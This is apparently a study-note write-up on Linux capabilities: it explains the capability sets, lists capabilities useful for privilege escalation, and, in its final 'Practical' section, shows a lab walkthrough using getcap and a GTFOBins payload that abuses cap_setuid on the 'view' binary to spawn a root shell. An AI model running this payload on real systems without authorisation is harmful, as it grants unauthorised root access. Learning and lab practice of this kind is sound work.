# Capabilities

Linux capabilities are a per-thread attribute of the root privileges that can be assigned to processes. By providing processes with capabilities, you reduce the potential damage compared to the same process running with full root privileges. Each thread has the following capability sets:

- **Effective (CapEff)**:   Represents all the capabilities used by processes; the kernel consults this set to grant or deny permissions for requested operations.
- **Permitted (CapPrm)**:   A superset of the effective capability set that includes capabilities a thread/process can add to its effective or inheritable capability sets. 
- **Inheritable (CapInh)**: Defines capabilities a parent process can pass to its child processes. This set is preserved across an [execve call](https://github.com/KayEm06/Linux-privilege-escalation/blob/main/Capabilities.md#execve-calls)
- **Bounding (CapBnd)**:    Sets a limit on the number of capabilities a process can possess.
- **Ambient (CapAmb)**:     Applies to non-SUID binaries and retains selected capabilities of a process after an execve call. The purpose of the ambient set is to allow a process to execute a program with elevated privileges to limit the number of capabilities held by each process.

The following is a list of capabilities that can be exploited.

- **CAP_CHOWN**: Makes arbitrary changes to file UIDs and GIDs.
- **CAP_DAC_OVERRIDE**: Bypasses file read, write, and execute permissions check.
- **CAP_NET_ADMIN**: Performs network-related operations.
- **CAP_NET_RAW**: Uses RAW and PACKET sockets.
- **CAP_SETGID**: Manipulates GIDs
- **CAP_SETFCAP**: Sets arbitrary capabilities on a file.
- **CAP_SETUID**: Manipulates UIDs
- **CAP_SYS_ADMIN**: Performs a range of system administration operations.

## Execve calls

An `execve` call is a function that executes a program from within a process. Whenever a process calls the `execve` function, the memory space allocated to the process is replaced with the new program.

# Practical

I retrieve all executables with capabilities.
```
getcap -r / 2>/dev/null
```
The two binaries at `/home/karen/vim` and `/home/ubuntu/view` have the `cap_setuid` capability in their effective capability sets. With this capability, we can manipulate the program to change the UID of our user to the root user's (0).

Using [GTFOBins](https://gtfobins.github.io/), I find a binary bypass specific to the "view" binary to gain escalated privileges.

The following payload can be run from the terminal to set the effective user ID to 0 (root) and execute the "/bin/sh" shell as root. 

```
/home/ubuntu/view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'.
```

